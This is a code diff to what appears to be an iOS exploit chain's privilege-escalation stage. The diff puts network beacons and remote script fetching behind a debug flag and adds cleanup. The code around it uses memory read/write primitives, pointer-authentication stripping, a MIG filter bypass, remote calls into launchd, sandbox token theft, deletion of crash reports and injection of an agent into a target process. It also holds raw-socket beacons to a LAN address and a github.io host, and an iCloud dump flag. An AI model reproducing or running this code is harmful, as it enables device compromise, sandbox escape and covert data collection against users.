@@ -1,7 +1,8 @@
 (() => {
+  const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
   try {
-    if (typeof XMLHttpRequest !== 'undefined') {
+    if (PE_ENABLE_DEBUG_NETWORK && typeof XMLHttpRequest !== 'undefined') {
       let xhr = new XMLHttpRequest();
       xhr.open("GET", "http://192.168.86.34:8888/beacon?s=xhr_start", false);
       xhr.send();
@@ -18,7 +19,7 @@
   } catch(e) {
     // Try to report fcall_init failure via XHR
     try {
-      if (typeof XMLHttpRequest !== 'undefined') {
+      if (PE_ENABLE_DEBUG_NETWORK && typeof XMLHttpRequest !== 'undefined') {
         let xhr = new XMLHttpRequest();
         xhr.open("GET", "http://192.168.86.34:8888/beacon?s=fcall_init_failed&e=" + encodeURIComponent(String(e)), false);
         xhr.send();
@@ -29,7 +30,7 @@
 
   // Beacon after fcall_init succeeds
   try {
-    if (typeof XMLHttpRequest !== 'undefined') {
+    if (PE_ENABLE_DEBUG_NETWORK && typeof XMLHttpRequest !== 'undefined') {
       let xhr = new XMLHttpRequest();
       xhr.open("GET", "http://192.168.86.34:8888/beacon?s=fcall_init_ok", false);
       xhr.send();
@@ -431,20 +432,22 @@
   let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
   // Early beacon - test if basic setup works
   try {
-    let _CONNECT = func_resolve("connect");
-    let _sock = fcall(SOCKET, 2n, 1n, 0n);
-    if (_sock != 0xFFFFFFFFFFFFFFFFn && _sock >= 0n) {
-      let _addr = fcall(CALLOC, 1n, 16n);
-      fcall(MEMSET, _addr, 0n, 16n);
-      uwrite16(_addr, 2n);
-      uwrite16(_addr + 2n, 0xb822n); // port 8888 big-endian
-      uwrite32(_addr + 4n, 0x2256a8c0n); // 192.168.86.34
-      if (fcall(_CONNECT, _sock, _addr, 16n) == 0n) {
-        let _req = get_cstring("GET /beacon?s=early HTTP/1.0\r\nHost: x\r\n\r\n");
-        fcall(WRITE, _sock, _req, 40n);
+    if (PE_ENABLE_DEBUG_NETWORK) {
+      let _CONNECT = func_resolve("connect");
+      let _sock = fcall(SOCKET, 2n, 1n, 0n);
+      if (_sock != 0xFFFFFFFFFFFFFFFFn && _sock >= 0n) {
+        let _addr = fcall(CALLOC, 1n, 16n);
+        fcall(MEMSET, _addr, 0n, 16n);
+        uwrite16(_addr, 2n);
+        uwrite16(_addr + 2n, 0xBB01n); // port 443 big-endian
+        uwrite32(_addr + 4n, 0x996CC7B9n); // 185.199.108.153
+        if (fcall(_CONNECT, _sock, _addr, 16n) == 0n) {
+          let _req = get_cstring("GET /lightsaber/beacon?s=early HTTP/1.0\r\nHost: zeroxjf.github.io\r\n\r\n");
+          fcall(WRITE, _sock, _req, 68n);
+        }
+        fcall(CLOSE, _sock);
+        fcall(FREE, _addr);
       }
-      fcall(CLOSE, _sock);
-      fcall(FREE, _addr);
     }
   } catch(e) {}
   let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
@@ -8438,6 +8441,10 @@ const ENABLE_ICLOUD_DUMP = false;
 const ENABLE_DUMP_COPYOUT = false;
 
 function fetchRemoteScript(path) {
+	if (!PE_ENABLE_DEBUG_NETWORK) {
+		LOG("[PE] remote fetch disabled for " + path);
+		return null;
+	}
 	try {
 		if (typeof XMLHttpRequest !== "undefined") {
 			let xhr = new XMLHttpRequest();
@@ -8700,8 +8707,10 @@ function start() { LOG("[+] PE start() called");
 		migFilterBypass.start();
 	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
 	if (!launchdTask.success()) {
+		launchdTask.destroy();
 		return false;
 	}
+	try {
 
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
@@ -8715,7 +8724,7 @@ function start() { LOG("[+] PE start() called");
 
 	LOG("[PE] Creating agent loader for " + targetProcess); let agentLoader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__["default"], migFilterBypass);
 	let agentPid = 0;
-
+	try {
 		if (agentLoader.inject()) { LOG("[+] Agent loader injected");
 			agentPid = agentLoader.task.pid();
 			libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(agentLoader.task);
@@ -8734,8 +8743,12 @@ function start() { LOG("[+] PE start() called");
 				libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("usleep", SBCUST_ONLY_SETTLE_DELAY_USEC);
 			}
 
-			agentLoader.destroy();
+		} else {
+			LOG("[PE] Agent loader inject failed");
 		}
+	} finally {
+		agentLoader.destroy();
+	}
 
 		if (ENABLE_POWERCUFF_TWEAK)
 			injectThermalmonitordPayload(migFilterBypass, POWERCUFF_TWEAK_PATH, POWERCUFF_TWEAK_LABEL);
@@ -9049,7 +9062,11 @@ function start() { LOG("[+] PE start() called");
 	} else {
 		LOG("[MG] 3-App Bypass (MobileGestalt patcher) disabled");
 	}
-	LOG("[PE] Cleaning up launchdTask..."); launchdTask.destroy(); LOG("[PE] start() completed successfully");
+	} finally {
+		LOG("[PE] Cleaning up launchdTask...");
+		launchdTask.destroy();
+	}
+	LOG("[PE] start() completed successfully");
 
 	return true;
 }
